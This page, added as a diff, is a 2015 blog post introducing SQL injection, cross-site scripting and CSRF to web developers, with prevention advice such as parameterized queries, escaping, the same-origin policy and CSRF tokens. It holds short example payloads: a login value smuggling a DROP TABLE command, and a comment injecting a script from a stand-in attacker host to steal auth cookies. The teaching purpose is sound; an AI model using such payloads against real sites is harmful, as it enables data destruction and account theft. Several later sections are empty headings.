@@ -1,0 +1,408 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>An Introduction to Injection, XSS, CSRF, and Practicing Safe Security</title>
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,400,300,600,700' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans+Condensed:300' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" href="http://clarkfeusier.com/css/base.css">
+    <link rel="shortcut icon" type="image/x-icon" href="http://clarkfeusier.com/img/favicon.ico" />
+    <script type="text/javascript" src="http://clarkfeusier.com/vendor/syntaxhighlighter_3.0.83/scripts/shCore.js"></script>
+    <script type="text/javascript" src="http://clarkfeusier.com/vendor/syntaxhighlighter_3.0.83/scripts/shBrushSql.js"></script>
+    <script type="text/javascript" src="http://clarkfeusier.com/vendor/syntaxhighlighter_3.0.83/scripts/shBrushRuby.js"></script>
+    <script type="text/javascript" src="http://clarkfeusier.com/vendor/syntaxhighlighter_3.0.83/scripts/shBrushBash.js"></script>
+    <script type="text/javascript" src="http://clarkfeusier.com/vendor/syntaxhighlighter_3.0.83/scripts/shBrushYaml.js"></script>
+    <script type="text/javascript" src="http://clarkfeusier.com/vendor/syntaxhighlighter_3.0.83/scripts/shBrushCss.js"></script>
+    <script type="text/javascript" src="http://clarkfeusier.com/vendor/syntaxhighlighter_3.0.83/scripts/shBrushJScript.js"></script>
+    <link href="http://clarkfeusier.com/vendor/syntaxhighlighter_3.0.83/styles/shCore.css" rel="stylesheet" type="text/css" />
+    <link href="http://clarkfeusier.com/vendor/syntaxhighlighter_3.0.83/styles/shThemeDefault.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+    <!-- Google Tag Manager -->
+    <noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-P9FNCG" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-P9FNCG');
+    </script>
+    <!-- End Google Tag Manager -->
+    <!-- Setup SyntaxHighlighter -->
+    <script type="text/javascript">SyntaxHighlighter.all()</script>
+    <!-- End SyntaxHighlighter Setup -->
+    <header>
+        <div id="logo">
+            <img src="http://clarkfeusier.com/img/headshot.png" alt="">
+        </div>
+        <div id="site-heading">
+            <h2 class="title">Clark Feusier</h2>
+            <h3 class="subtitle">Software Engineer and Metalogician</h3>
+        </div>
+        <ul id="nav">
+         <li class=""><a href="http://clarkfeusier.com/pages/about">About</a></li>
+         <li class=""><a href="http://clarkfeusier.com/index.html">Writing</a></li>
+         <li class=""><a href="http://clarkfeusier.com/pages/portfolio">Portfolio</a></li>
+         <li><a href="#" id="contact-section">Contact</a></li>
+     </ul>
+     <div id="contact-wrapper">
+        <div id="contact-content">
+            <ul id="contact-list">
+                <i class="fa fa-envelope-o contact-icon"></i>
+                <li><a href="mailto:cfeusier@gmail.com">  cfeusier@gmail.com</a></li>
+                <li class="separator">/</li>
+                <li><a href="http://github.com/cfeusier"><i class="fa fa-github"></i></a></li>
+                <li><a href="http://twitter.com/clarkfeusier"><i class="fa fa-twitter"></i></a></li>
+                <li><a href="http://facebook.com/cfeusier"><i class="fa fa-facebook"></i></a></li>
+                <li><a href="http://linkedin.com/in/clarkfeusier"><i class="fa fa-linkedin"></i></a></li>
+            </ul>
+        </div>
+        <a href="#" id="contact-close"><i class="fa fa-times"></i></a>
+    </div>
+</header>
+<div id="main-contents">
+<div class="single-post">
+    <div class="container">
+        <div class="post-item">
+            <div class="post-header">
+                <div class="blog-no-header"></div>
+            </div>
+            <div class="post-body">
+                <div class="meta">
+                    <span class="date">28 May 2015</span>
+                </div>
+                <h2 class="title">An Introduction to Injection, XSS, CSRF, and Practicing Safe Security</h2>
+                <div class="content">
+                    <blockquote><h2>Every user of your web app is trying to break it</h2></blockquote>
+
+<p>In this post, we will discuss <strong><em>practical web security</em></strong>.</p>
+
+<p>We will start by covering the <strong>who</strong> — who you need to protect against. Next, we will cover the <strong>what</strong> — what common exploits you need to know about and protect against. Finally, the <strong>how</strong> — how to protect against the common exploits, including code examples.</p>
+
+<p>If you are interested, let us begin.</p>
+
+<hr />
+
+<h1 id="trust-no-one">Trust. No. One.</h1>
+
+<blockquote><h2>Your users are usually evil or dumb</h2></blockquote>
+
+<p>You should love your users, kind of. You should also <strong>fear</strong> them. For our purposes, there are three different types of user against which you need to protect.</p>
+
+<ol>
+  <li>evil users</li>
+  <li>dumb users</li>
+  <li>careless users</li>
+</ol>
+
+<p><strong>Evil Users</strong>:</p>
+
+<p>This is the obvious category — there are real black-hat hackers, cyber-terrorists, and ubiquitous bots probing the web for weakness around the clock.</p>
+
+<p><strong>Dumb Users</strong>:</p>
+
+<p>Users cannot always figure out which link to click, what format they should use to input their data, how to create secure passwords, how to submit an order, <strong>ad nauseaum</strong>.</p>
+
+<p><strong>Careless Users</strong>:</p>
+
+<p>This group is you and your engineering team. The late night merge, the mistyped database command, and the junior developer will break your soul when you are least expecting it.</p>
+
+<p>Now, <strong><em>combine all three groups</em></strong> — dumb and careless users make it easy for evil users to discover exploits. <strong>TL;DR</strong> — you need to care about web security and you need to act to protect your products and systems.</p>
+
+<h3 id="but-how-much-do-i-really-need-to-care-about-web-security">But, how much do I really need to care about web security?</h3>
+
+<p>If you are reading this post, I assume that you are learning about web security in order to protect an ‘average’ website or application.</p>
+
+<p>What do I mean by <strong>average</strong>?</p>
+
+<p>Are you engineering a product for a Fortune 500 company? Are you working on web technology for a financial institution? Are you processing and/or storing credit card information <strong>on your servers</strong>? Are you protecting confidential government information?</p>
+
+<p>If you answered <strong>yes</strong> to any of the above, I am a little nervous that you are reading this… If you answered <strong>no</strong> to all of the above, then start by securing against the following common exploits.</p>
+
+<hr />
+
+<h1 id="common-exploits">Common Exploits</h1>
+
+<p>At a high-level, we will cover two different types of web application exploit — <strong>injection</strong> and <strong>cross-site request forgery</strong>. We will start with injection.</p>
+
+<h2 id="injection">Injection</h2>
+
+<p>As a general approximation, we can say that <strong>code injection</strong> is an exploitation that occurs when an application <strong><em>sends untrusted data to an interpreter</em></strong> that alters the intended logic of the program, usually maliciously (<a href="http://en.wikipedia.org/wiki/Code_injection">source</a>).</p>
+
+<p>We will talk about important types of code injection — SQL injection and HTML/script injection.</p>
+
+<h3 id="sql-injection">SQL Injection</h3>
+
+<p><strong>SQL injection</strong> is an exploit that injects a SQL database command in order to read or modify the database (<a href="http://en.wikipedia.org/wiki/SQL_injection">source</a>).</p>
+
+<p>This is a very common, dangerous, yet easy to prevent exploit. Imagine that some asshole wanted to drop your production database (containing all of your customer data). Now, imagine that you have a login form that allows users to login to your application via a username and password combination.</p>
+
+<p>Now, it could be the case that your form sends a POST HTTP request to a server, which then composes a SQL query out of the form data. The SQL query could be something simple like the following:</p>
+
+<script src="https://gist.github.com/Cfeusier/02e7c0af21e579035a7e.js"></script>
+
+<p>If your server hits a database with the above SQL query, the server will get back all of the user records with <code>Username</code> and <code>Password</code> for the <code>username</code> and <code>password</code> fields. Assume the authentication is based on such a simple presence validation.</p>
+
+<p>Now, imagine that the aforementioned butthead submits some evil data via your login form. Maybe she enters <code>Username</code> in the <code>username</code> form-field, and then for the <code>password</code> she enters <code>"Password';DROP TABLE users"</code>.</p>
+
+<p>If your SQL query API allows for multiple statements to be executed in a single call, then your SQL server will execute something similar to the following:</p>
+
+<script src="https://gist.github.com/Cfeusier/daade1fb33eca133e4f1.js"></script>
+
+<p>Goodbye user data. The <code>';DROP TABLE users'</code> string was the <strong>injected</strong> SQL code, which was unknowingly executed by the SQL server, resulting in the loss of all your user data.</p>
+
+<p>Please take the following away from this section — <strong><em>SQL injection flaws occur when a SQL database server interacts with the database using statements composed out of data from an external source</em></strong>.</p>
+
+<p>But, you need to dynamically query your database, so how do you avoid SQL injection exploits? Here are some good guidelines. Note, these topics will be expounded upon further in the section below covering protection mechanisms.</p>
+
+<ol>
+  <li>always write SQL statements that use parameters instead of direct variable evaluations</li>
+  <li>(optional) use an ORM that generates parameterized statements</li>
+  <li>validate input data using well-tested regular expressions</li>
+  <li>escape characters that have special meaning within SQL</li>
+</ol>
+
+<p>I will describe the above protection techniques in detail after we have covered all of the different exploits. Let us move on to another injection exploit called <strong>XSS</strong>, which stands for <em>cross-site script injection</em>.</p>
+
+<h3 id="xss---cross-site-script-injection">XSS - Cross-Site Script Injection</h3>
+
+<p><strong>XSS</strong>, <strong>cross-site script injection</strong>, or <strong>cross-site scripting</strong>, is an exploit that injects a script into a web document. When other users view the compromised web document, the script is executed by the client environment with the same access to resources as the surrounding web document. With the granted resource-access, the malicious script can run amok with private content, session cookies, localStorage data, and more (<a href="">source</a>).</p>
+
+<p>XSS comes down to getting a script into some web document that will be sent to a client web-browser; the script gets treated as though it is delivered from a trusted source, so it can access certain privileged information in the environment. Usually, the script will capture the privileged information and send it to a server of its choosing for later use.</p>
+
+<p>Here is the usual example of an XSS exploit, as described by <a href="http://en.wikipedia.org/wiki/Cross-site_scripting">Wikipedia</a> (slightly modified):</p>
+
+<ul>
+  <li>Hacker observes that your website contains an XSS vulnerability — the comments section will display whatever is typed for a new comment, even if the comment text contains HTML tags, so all script tags are executed</li>
+  <li>
+    <p>Hacker posts a new comment with the following text:</p>
+
+    <blockquote>
+      <p>I love the puppies in this story! They’re so cute!<code>&lt;script src="http://hackityhack.com/authstealer.js"&gt;</code></p>
+    </blockquote>
+  </li>
+  <li>The <code>authstealer.js</code> script accesses the current user’s authorization cookie and sends it to a secret server for storage</li>
+  <li>Now, when anyone visits the webpage with Hacker’s comment, the <code>authstealer.js</code> script will run and steal the current user’s authorization cookie data</li>
+  <li>Hacker can now impersonate visitors with valid accounts on your website — e.g., Hacker could login as a user and steal the credit card information stored in the account profile of the impersonated user</li>
+</ul>
+
+<p>Takeaway from this section: <strong><em>XSS flaws occur when a web document is vulnerable to injection of foreign scripts executed unknowingly by a client environment.</em></strong> This often occurs through the acceptance of unsanitized user input.</p>
+
+<p>But, you need to accept user input throughout your site! How do you avoid these XSS vulnerabilities? Similar to the protections against other <strong><em>injection</em></strong> exploits, here are some guidelines to avoid XSS exploit:</p>
+
+<ol>
+  <li>escape unstrusted input strings — there are many available security encoding libraries</li>
+  <li>sanitize HTML input — there are many available sanitization engines</li>
+  <li>don’t store private information in session cookies — session data is <em>public</em>, for the most part</li>
+</ol>
+
+<p>Let us proceed to the last exploit-type that we will cover in this post, before we circle back to protection mechanisms. This final exploit, <strong><em>cross-site request forgery</em></strong>, hereforth <strong>CSRF</strong>, will take our discussion into the rapidly-changing world of browser security policy. <strong><em>On y va</em></strong>.</p>
+
+<h2 id="csrf---cross-site-request-forgery">CSRF - Cross-Site Request Forgery</h2>
+
+<p>Cross-site request forgery, <strong>CSRF</strong>, XSRF, one-click attack, or session-riding, is a type of <strong><em>confused deputy exploit</em></strong>. At a high-level, the web browser is confused by an HTTP request that forges the identity of a legitimate user. The web browser unknowingly misuses the authority of the legitimate user in service of the request forger.</p>
+
+<p>What does CSRF look like in practice?</p>
+
+<p>Usually, a hacker finds a way to place a link, image, or script into a web document where a legitimate user will be logged-in. A legitimate user visits the website, is authenticated, visits the page that serves the web document infected with the hacker’s code, and is enticed to execute the hacker’s bait. Then, the hacker can ‘ride’ the legitimate user’s authenticated session and <strong>forge</strong> a request that appears as though it was made by the legitimate user — usually, the forged request does something naughty while it has the legitimate user’s permissions.</p>
+
+<p>The above scenario assumes that the exploited site is storing the legitimate user’s authentication data in a session cookie that has not expired. Here is another example, though more specific:</p>
+
+<ul>
+  <li>Let’s assume that a hacker posts a comment with a link on <code>https://origin-site.com</code> — the link source looks like this: <code>&lt;a href="http://hackity-hack.com/squeeze-page"&gt;THIS IS SO IMPORTANT YOU NEED TO SEE IT!&lt;/a&gt;</code></li>
+  <li>Let’s also assume that <code>https://origin-site.com</code> is a webpage where a legitimate user is usually authenticated</li>
+  <li>A legitimate user visits <code>https://origin-site.com</code> and is authenticated — a session-cookie is planted to authenticate further requests</li>
+  <li>This user sees the hacker’s comment with the link and obviously <strong>needs</strong> to see where this link goes; <strong><em>click</em></strong></li>
+  <li>The legitimate user of <code>https://origin-site.com</code> is transported by the web browser to <code>http://hackityhack.com/squeeze-page</code>, where the following script is run:</li>
+</ul>
+
+<script src="https://gist.github.com/Cfeusier/3463967d1328a34ab7bf.js"></script>
+
+<ul>
+  <li>Finally, let’s assume that the <code>/user-data</code> endpoint responds with all of the user’s sensitive data, if the requestor is authenticated</li>
+  <li>The hacker appears to be a legitmate requestor and receives the sensitive data</li>
+  <li>The hacker sends the sensitive data directly to his server to save for later use</li>
+</ul>
+
+<p>Takeaway from this section: <strong><em>CSRF exploits occur when a party forges a request to a website as a user that is ‘trusted’, confusing the web browser into performing commands on behalf of the forged user</em></strong>.</p>
+
+<p>Thankfully, <strong>the above CSRF attack will not work</strong>.</p>
+
+<p>Enter <strong><em>the web application security model</em></strong> — in our case, the <strong>same-origin policy</strong> for XMLHttpRequest asynchronous requests. Let us quickly turn our attention to the same-origin policy and how it prevents the above attack.</p>
+
+<h3 id="the-same-origin-policy-xhr">The Same-Origin Policy (XHR)</h3>
+
+<p>The <strong>same-origin policy</strong> for XHR (SO policy for this section) is a concept from the browser security model for web applications. Note well, all major web browsers implement some form of a SO policy, though the details of implementation may differ.</p>
+
+<p>Roughly, the SO policy only allows scripts from one webpage to access data from another webpage, if <em>both</em> webpages have the same <strong>origin</strong> (<a href="http://en.wikipedia.org/wiki/Same-origin_policy">source</a>).</p>
+
+<p>In order to understand how the SO policy prevents the above CSRF attack, let’s dissect the SO policy.</p>
+
+<p>What does it mean for a webpage to have the <strong>same</strong> <strong><em>origin</em></strong> as another webpage?</p>
+
+<blockquote>
+  <p>Two webpages have the <strong><em>same origin</em></strong> if and only if both webpages are served from the same combination of <strong>URI scheme, hostname, and port number</strong></p>
+</blockquote>
+
+<p>For example, <code>http://</code> and <code>https://</code> are <strong>different</strong> protocols (part of the URI scheme) — they generate different origins. Similarily, <code>www.site.com</code> and <code>v2.site.com</code> are different hostnames, thus, they generate different origins according to the SO policy. Finally, <code>http://site.com</code> and <code>http://site.com:4001</code> have different port numbers, so they have different origins.</p>
+
+<p>Now, we can see how the SO policy prevents the above CSRF attack — the SO policy requires that the two webpages have an <strong><em>exactly matching</em></strong> origin, but <code>https://origin-site.com</code> and <code>http://hackityhack.com</code> <strong>do not</strong> have a matching origin. So, the browser’s implementation of the SO policy should catch the forged request and disallow it.</p>
+
+<p>Great, the SO policy saves us from some CSRF exploits. So, why are we talking about CSRF?</p>
+
+<p><strong>Life is never that simple…</strong></p>
+
+<p>For most production applications, the SO policy is <em>too restrictive</em>! Also, extra protection measures are required to stop many types of CSRF exploit.</p>
+
+<p>Let’s tackle the latter complication first — how to add extra protection based on the SO policy to prevent a larger swath of CSRF exploit.</p>
+
+<p><strong>CSRF Tokens — Cookie-to-Header Tokens</strong></p>
+
+<p>Web applications can be further secured against CSRF by using <strong><em>CSRF tokens</em></strong>, also called <em>cookie-to-header tokens</em>. Here is the idea — when a user is authenticated, a session cookie is set with a random token, which is copied into a custom HTTP header on the client.</p>
+
+<p>The client can then send the custom header on each request, allowing the server to check the incoming request for integrity. Note, this technique relies directly on the SO policy — JavaScript from the incorrect origin will be forbidden from reading the value of the token out of the cookie.</p>
+
+<p>We are now aware of how to secure against CSRF, how the SO policy helps in this cause, and how cookie-to-header tokens are used for extra security. Let’s circle back to the earlier caveat — the SO policy is <strong><em>too restrictive</em></strong>.</p>
+
+<p><strong>Safely Circumventing the SO policy</strong></p>
+
+<p>What does it mean to say that the SO policy can be <strong><em>too restrictive</em></strong>?</p>
+
+<p>Most web applications these days are not islands — they consume and serve resources with other applications, which may be on different domains. The SO policy makes asynchronous HTTP communication between applications on different domains quite difficult. For example, large applications tend to be fragmented into modules using subdomains like <code>store.site.com</code> and <code>admin.site.com</code> — the SO policy considers <code>store.site.com</code> and <code>admin.site.com</code> to be of different origin, so resource sharing between the components will require a <strong>circumvention of the SO policy</strong>.</p>
+
+<p>There are <strong>multiple options</strong> for circumventing the SO policy. <strong><em>Note well, none of the options is perfect, nor will any of the options be one hundred percent cross-browser compatible</em></strong>. I will do my best to clearly state the tradeoffs of each option, and I will provide a fun infographic at the end to help you choose the best option for your use-case.</p>
+
+<p>The options for ‘relaxing’ the SO policy, which I will briefly discuss in turn, are <strong><em>cross-origin resource sharing (CORS), JSON with padding (JSONP), <code>document.domain</code> manipulation, and the <code>window.postMessage</code> message system</em></strong>.</p>
+
+<h3 id="cross-origin-resource-sharing-cors">Cross-Origin Resource Sharing (CORS)</h3>
+
+<blockquote>
+  <p>CORS defines a way in which a browser and server can interact to safely determine whether or not to allow the cross-origin request. It allows for more freedom and functionality than purely same-origin requests, but is more secure than simply allowing all cross-origin requests. It is a recommended standard of the W3C (<a href="http://en.wikipedia.org/wiki/Cross-origin_resource_sharing">source</a>).</p>
+</blockquote>
+
+<script src="https://gist.github.com/Cfeusier/e9868ed6e7c5a24e8983.js"></script>
+
+<ul>
+  <li>allows server to opt into serving requests that come from a different origin</li>
+  <li>extends HTTP by adding a new request header option named <code>Origin</code> and a corresponding response header option named <code>Access-Control-Allow-Origin</code>.</li>
+  <li>server can whitelist requestor domains (exact or pattern-match)</li>
+  <li>not supported fully — IE 10+, Firefox 3.5+, Safari 4+, and Chrome 10+ supported</li>
+  <li><code>"access-control-allow-&lt;option&gt;"</code> — <code>origin</code>, <code>methods</code>, <code>headers</code>, <code>max-age</code></li>
+  <li><code>"access-control-allow-methods": "OPTIONS"</code> needs to be set</li>
+</ul>
+
+<p>(<a href="http://en.wikipedia.org/wiki/Cross-origin_resource_sharing">source</a>)</p>
+
+<p><strong>Websockets + Whitelisting</strong></p>
+
+<ul>
+  <li>same concept as XHR CORS, except with websockets instead of XHR requests</li>
+</ul>
+
+<h3 id="json-with-padding-jsonp">JSON with Padding (JSONP)</h3>
+
+<h3 id="setting-documentdomain">Setting <code>document.domain</code></h3>
+
+<h3 id="windowpostmessage"><code>window.postMessage</code></h3>
+
+<hr />
+
+<h1 id="simple-protection-mechanisms">Simple Protection Mechanisms</h1>
+
+<h2 id="protecting-against-injection">Protecting against Injection</h2>
+
+<ul>
+  <li>Parameterized Statements</li>
+  <li>Input Validation</li>
+  <li>Escaping and Sanitization</li>
+  <li>Smart-use of Session Cookies</li>
+</ul>
+
+<h2 id="protecting-against-csrf">Protecting against CSRF</h2>
+
+<ul>
+  <li>Same-Origin Policy (for free)</li>
+  <li>Cookie-to-Header Tokens</li>
+</ul>
+
+<hr />
+
+<h1 id="practice-safe-security">Practice Safe Security</h1>
+
+<ul>
+  <li>care about security</li>
+  <li>know the common exploits</li>
+  <li>prevent low-hanging fruit exploits</li>
+</ul>
+
+
+                </div>
+            </div>
+            <div class="post-tags">
+                <i class="fa fa-tags"></i>
+                
+                <a class="tag_list_link" href="http://clarkfeusier.com/tag/web security">web security</a>
+                <span class="seperator">,</span>
+                
+                <a class="tag_list_link" href="http://clarkfeusier.com/tag/xss">xss</a>
+                <span class="seperator">,</span>
+                
+                <a class="tag_list_link" href="http://clarkfeusier.com/tag/csrf">csrf</a>
+                <span class="seperator">,</span>
+                
+                <a class="tag_list_link" href="http://clarkfeusier.com/tag/injection">injection</a>
+                <span class="seperator">,</span>
+                
+                <a class="tag_list_link" href="http://clarkfeusier.com/tag/best practices">best practices</a>
+                <span class="seperator">,</span>
+                
+            </div>
+            <ul class="post-socials">
+                <li><a href="https://www.facebook.com/sharer/sharer.php?u=http://clarkfeusier.com/2015/05/28/browser-security-xss-csrf-injection-safety.html&t=An Introduction to Injection, XSS, CSRF, and Practicing Safe Security" target="_blank"><i class="fa fa-facebook"></i></a></li>
+                <li><a href="https://twitter.com/intent/tweet?original_referer=http://clarkfeusier.com/2015/05/28/browser-security-xss-csrf-injection-safety.html&text=An Introduction to Injection, XSS, CSRF, and Practicing Safe Security&url=http://clarkfeusier.com/2015/05/28/browser-security-xss-csrf-injection-safety.html" target="_blank"><i class="fa fa-twitter"></i></a></li>
+                <li><a href="https://plus.google.com/share?url=http://clarkfeusier.com/2015/05/28/browser-security-xss-csrf-injection-safety.html" target="_blank"><i class="fa fa-google-plus"></i></a></li>
+            </ul>
+        </div>
+    </div>
+    <div id="blog-pagination">
+        <ul>
+        	
+            <li class="prev"><a href="http://clarkfeusier.com/2015/05/24/jkif-parser-release-knowledge-engineering.html"><i class="fa fa-angle-left"></i><span>Prev</span></a></li>
+            
+            
+            <li class="separator"></li>
+            
+            
+        </ul>
+    </div>
+</div>
+ </div>
+       <footer>
+            <div id="footer-quote">
+                <div class="container">
+                    <div class="contents">
+                        <div class="quote-icon">
+                            <i class="fa fa-quote-right"></i>
+                        </div>
+                        <span class="quote-name">Percy Bysshe Shelley</span>
+                        <div class="quote-text">
+                            The soul's joy lies in <span class="colored-text">doing</span>.
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="bottom">
+                <div class="container foot">
+                    <ul id="social-icons">
+                        <li><a href="http://github.com/cfeusier"><i class="fa fa-github"></i></a></li>
+                        <li><a href="http://twitter.com/clarkfeusier"><i class="fa fa-twitter"></i></a></li>
+                        <li><a href="http://facebook.com/cfeusier"><i class="fa fa-facebook"></i></a></li>
+                        <li><a href="http://linkedin.com/in/clarkfeusier"><i class="fa fa-linkedin"></i></a></li>
+                    </ul>
+                    <div id="copyright">© COPYRIGHT 2015 Clark Feusier</div>
+                    <a id="home-circle" href="http://clarkfeusier.com"><i class="fa fa-home"></i></a>
+                </div>
+            </div>
+       </footer>
+       <script type="text/javascript" src="http://clarkfeusier.com/js/jquery-1.11.0.min.js"></script>
+       <script type="text/javascript" src="http://clarkfeusier.com/js/header_glitter.js"></script>
+    </body>
+</html>
